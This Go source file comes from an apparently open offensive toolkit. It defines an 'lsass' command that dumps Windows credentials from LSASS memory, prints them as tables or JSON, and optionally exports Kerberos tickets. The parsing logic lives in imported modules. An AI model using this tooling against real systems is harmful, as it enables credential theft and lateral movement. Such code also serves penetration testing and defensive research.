package lsass

import (
	"fmt"

	"github.com/spf13/cobra"
	"github.com/vincd/savoir/modules/sekurlsa"
	"github.com/vincd/savoir/utils"
)

var Command = &cobra.Command{
	Use:   "lsass",
	Short: "Dump credentials from lsass",
	Long: `
		Dump credentials from lsass.
		All modules and Architecture/BuildNumber are not supported yet.
		Thanks to @gentilkiwi and @skelsec.
		`,
}

type systemInfo struct {
	MajorVersion          uint32 `json:"major_version"`
	MinorVersion          uint32 `json:"minor_version"`
	BuildNumber           uint32 `json:"build_number"`
	ProcessorArchitecture string `json:"processor_architecture"`
}

func PrintLsassDump(si systemInfo, l *sekurlsa.LsaSrv, isJson bool, dumpKerberosTicket bool) error {
	entries, err := l.ListEntries()
	if err != nil {
		return err
	}

	if isJson {
		o := make(map[string]interface{})
		o["system_info"] = si
		o["credentials"] = entries

		outputJson, err := utils.PrettyfyJSON(o)
		if err != nil {
			return err
		}
		fmt.Printf("%s\n", outputJson)
	} else {
		table := utils.PrintTable(si)
		fmt.Printf("%s\n", table)

		for _, entry := range entries {
			fmt.Printf("--- Find new entry -------------------------------------------------------------\n")
			fmt.Printf("%s", entry)
			fmt.Printf("--------------------------------------------------------------------------------\n\n")
		}
	}

	if dumpKerberosTicket {
		for _, entry := range entries {
			if entry.Kerberos != nil && len(entry.Kerberos.Tickets) > 0 {
				for _, ticket := range entry.Kerberos.Tickets {
					if _, err := ticket.Dump(); err != nil {
						fmt.Printf("%s\n", err)
						continue
					}
				}
			}
		}
	}

	return nil
}
